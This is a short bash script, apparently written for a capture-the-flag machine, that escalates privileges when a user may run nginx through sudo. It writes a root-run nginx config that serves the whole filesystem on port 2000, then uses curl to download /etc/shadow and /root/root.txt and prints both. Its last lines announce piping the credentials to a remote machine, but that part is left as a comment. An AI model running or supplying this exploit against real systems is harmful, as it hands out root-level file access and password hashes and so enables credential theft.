#!/bin/bash
echo "Privilige Escalation if SUDO set for NGINX"
cd /home/"$USER"/

#Create the malicious config file as a one liner
echo 'user root; worker_processes 1; events {worker_connections 1024;} http {  server { listen 2000; root /; location /oofy/ { alias /;  } } }' > ii.conf

cat ii.conf

#Setting up nginx with vuln Service
sudo /usr/sbin/nginx -s quit
sleep 1
sudo /usr/sbin/nginx -c /home/activemq/ii.conf

sleep 3 # Wait for nginx to start.

curl 127.0.0.1:2000/etc/shadow -o creds.txt
curl 127.0.0.1:2000/root/root.txt -o root.txt

cat root.txt
echo "-----------------------------------"
cat creds.txt

sleep 1

sudo /usr/sbin/nginx -s quit #Kill
rm ii.conf

echo "Done, Piping Creds to REMOTE Machine"

#Implement the remote Parsing to our MACHINE
